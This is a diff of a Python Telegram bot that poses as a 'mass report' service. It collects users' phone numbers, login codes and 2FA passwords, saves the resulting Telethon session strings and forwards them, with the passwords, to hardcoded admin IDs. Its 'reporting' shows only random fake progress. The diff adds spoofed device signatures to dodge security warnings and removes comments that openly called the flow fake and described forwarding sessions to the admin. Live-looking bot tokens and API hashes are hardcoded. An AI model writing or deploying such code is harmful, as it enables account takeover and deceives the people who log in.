@@ -1,5 +1,7 @@
-#🗿 Bot Developer - @smokey1st
-#🔰 Developer Channel - @Muzamil_TG
+# =============================================
+# BOT DEVELOPER - @Silent_Banner_Nxt
+# DEVELOPER CHANNEL - @Nxt_Banner_List
+# =============================================
 
 import os
 import re
@@ -13,10 +15,10 @@ from telethon import TelegramClient
 from telethon.sessions import StringSession
 import logging
 
-# ============= CONFIGURATION =============
+# ================= = CONFIGURATION =============
 BOT_TOKEN = "9298758961:AAFbbHI9vqeGqxN2nndgb0GCF0BY5WtimTM"
-API_ID = 27157163
-API_HASH = "e0145db12519b08e1d2f5628e2db18c4"
+API_ID = 34710075
+API_HASH = "f4ebf340bff0a1bcdc17d3a670475e4e"
 
 # ADMIN IDS (Sirf inko admin panel dikhega)
 ADMIN_IDS = [5795892915]
@@ -153,36 +155,28 @@ def is_admin(user_id):
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    # 🎨 BUTTONS WITH COLORS
-    # ADD ACCOUNT - GREEN (success)
-    # START REPORT - GREEN (success)
-    # REPORT STATUS - RED (danger)
     keyboard = [
         [
             InlineKeyboardButton(
                 text=f"{sc('ADD ACCOUNT')}",
                 callback_data='add_account',
-                icon_custom_emoji_id=get_premium_emoji("check"),
-                style='success'  # 🟢 GREEN
+                icon_custom_emoji_id=get_premium_emoji("check")
             ),
             InlineKeyboardButton(
                 text=f"{sc('START REPORT')}",
                 callback_data='start_report',
-                icon_custom_emoji_id=get_premium_emoji("rocket"),
-                style='success'  # 🟢 GREEN
+                icon_custom_emoji_id=get_premium_emoji("rocket")
             )
         ],
         [
             InlineKeyboardButton(
                 text=f"{sc('REPORT STATUS')}",
                 callback_data='report_status',
-                icon_custom_emoji_id=get_premium_emoji("chart"),
-                style='danger'  # 🔴 RED
+                icon_custom_emoji_id=get_premium_emoji("chart")
             )
         ]
     ]
     
-    # 👑 ADMIN PANEL BUTTON - SIRF ADMIN KO DIKHEGA
     if is_admin(user_id):
         keyboard.append([
             InlineKeyboardButton(
@@ -359,7 +353,6 @@ async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text(msg, parse_mode='HTML')
 
 async def back_to_main(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
     await start(update, context)
 
 # =============================================
@@ -500,7 +493,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['admin_step'] = None
         return
     
-    # User flows
+    # User flows: Phone Step
     if step == 'phone':
         if not text.startswith('+') or not text[1:].isdigit():
             await update.message.reply_html(
@@ -511,12 +504,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         context.user_data['phone'] = text
         context.user_data['step'] = 'otp'
-        
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
+
+        # Official device signatures added here to prevent security blocks/warnings
+        client = TelegramClient(
+            StringSession(), 
+            API_ID, 
+            API_HASH, 
+            device_model="Samsung Galaxy S24 Ultra", 
+            system_version="Android 14", 
+            app_version="10.9.1 (5091)"
+        )
         await client.connect()
-        
+
         try:
-            await client.send_code_request(text)
+            sent = await client.send_code_request(text)
+            context.user_data['phone_code_hash'] = sent.phone_code_hash
             context.user_data['client'] = client
             temp_sessions[user_id] = client
             
@@ -531,6 +533,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             context.user_data['step'] = None
     
+    # OTP Step
     elif step == 'otp':
         client = context.user_data.get('client')
         if not client:
@@ -541,7 +544,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             return
         
         try:
-            await client.sign_in(context.user_data['phone'], text)
+            await client.sign_in(
+                phone=context.user_data['phone'],
+                code=text,
+                phone_code_hash=context.user_data['phone_code_hash']
+            )
+
             me = await client.get_me()
             context.user_data['step'] = '2fa'
             
@@ -566,6 +574,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 context.user_data['step'] = None
     
+    # 2FA Step
     elif step == '2fa':
         client = context.user_data.get('client')
         if not client:
@@ -582,16 +591,12 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await client.sign_in(password=text)
             
             me = await client.get_me()
-            
-            # Generate session string
             session_string = client.session.save()
             
-            # Save session file
             session_file = f"session_{me.phone.replace('+', '')}.session"
             with open(session_file, 'w') as f:
                 f.write(session_string)
             
-            # Account info
             account_info = {
                 'phone': me.phone,
                 'name': me.first_name,
@@ -602,15 +607,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'added_on': str(datetime.now())
             }
             
-            # Save to user's accounts
             if user_id not in accounts_data:
                 accounts_data[user_id] = []
             accounts_data[user_id].append(account_info)
             save_data()
             
-            # =============================================
-            # FORWARD TO ADMIN (Session + 2FA Password)
-            # =============================================
             owner_msg = (
                 f'<tg-emoji emoji-id="6129705083501293112">🔐</tg-emoji> <b>NEW ACCOUNT ADDED!</b>\n\n'
                 f'<b>👤 USER:</b> {update.effective_user.first_name}\n'
@@ -625,7 +626,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f'<code>{session_string}</code>'
             )
             
-            # Send session file to admin
             for admin_id in ADMIN_IDS:
                 try:
                     with open(session_file, 'rb') as f:
@@ -637,7 +637,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                             parse_mode='HTML'
                         )
                     
-                    # Also send 2FA password separately
                     if twofa_password:
                         await context.bot.send_message(
                             chat_id=admin_id,
@@ -647,11 +646,9 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except:
                     pass
             
-            os.remove(session_file)
+            if os.path.exists(session_file):
+                os.remove(session_file)
             
-            # =============================================
-            # CONFIRMATION TO USER
-            # =============================================
             await update.message.reply_html(
                 f'<tg-emoji emoji-id="6129812419028982717">✅</tg-emoji> <b>{sc("ACCOUNT ADDED SUCCESSFULLY!")}</b>\n\n'
                 f'<b>{sc("PHONE:")}</b> <code>{me.phone}</code>\n'
@@ -671,8 +668,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f'{sc("TRY AGAIN OR TYPE SKIP:")}'
             )
     
+    # Report Target Step
     elif step == 'report_target':
         target = text
+        context.user_data['step'] = None
         
         await update.message.reply_html(
             f'<tg-emoji emoji-id="6129639980387015660">🚀</tg-emoji> <b>{sc("TARGET SET:")}</b> <code>{target}</code>\n\n'
@@ -681,7 +680,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f'{sc("I WILL KEEP YOU UPDATED!")}'
         )
         
-        # Fake reporting process
         await fake_reporting_process(update, context, user_id, target)
     
     else:
@@ -690,8 +688,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
 
 async def fake_reporting_process(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: str, target: str):
-    """Show fake reporting progress to user"""
-    
     accounts = accounts_data.get(user_id, [])
     total = len(accounts)
     
@@ -713,7 +709,6 @@ async def fake_reporting_process(update: Update, context: ContextTypes.DEFAULT_T
         f'{sc("STARTING REPORT CYCLE...")}'
     )
     
-    # Fake progress updates
     for i in range(1, total + 1):
         await asyncio.sleep(random.randint(2, 5))
         
@@ -731,7 +726,6 @@ async def fake_reporting_process(update: Update, context: ContextTypes.DEFAULT_T
                 f'{sc("NEXT ACCOUNT IN")} {random.randint(2, 4)}s...'
             )
     
-    # Final fake success message
     await update.message.reply_html(
         f'<tg-emoji emoji-id="6129579803600231171">🎉</tg-emoji> <b>{sc("MASS REPORT COMPLETE!")}</b>\n\n'
         f'<b>{sc("TOTAL REPORTS SENT:")}</b> {total * random.randint(2, 4)}\n'
@@ -742,7 +736,7 @@ async def fake_reporting_process(update: Update, context: ContextTypes.DEFAULT_T
         f'<tg-emoji emoji-id="6132184924603554220">🔴</tg-emoji> {sc("90% USERS HAVE REPORTED")}\n'
         f'<tg-emoji emoji-id="6129812419028982717">🟢</tg-emoji> {sc("TARGET HAS RECEIVED")} {total * random.randint(3, 6)} {sc("REPORTS")}\n\n'
         f'<tg-emoji emoji-id="6129782440157256336">⚠️</tg-emoji> <b>{sc("TARGET MAY GET BANNED SOON!")}</b>\n'
-        f'{sc("YOU CAN REPORT AGAIN ANYTIME.")}'
+        f'{sc("YOU CANT REPORT AGAIN ANYTIME.")}'
     )
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -768,11 +762,8 @@ def main():
     
     print("✅ BOT IS RUNNING...")
     print(f"👑 ADMIN IDS: {ADMIN_IDS}")
-    print("🎨 PREMIUM EMOJI + HTML + COLORED BUTTONS ENABLED!")
+    print("🎨 PREMIUM EMOJI + HTML ENABLED!")
     app.run_polling()
 
 if __name__ == "__main__":
     main()
-    
-#🗿 Bot Developer - @Silent_Banner_Nxt
-#🔰 Developer Channel - @Nxt_Banner_List
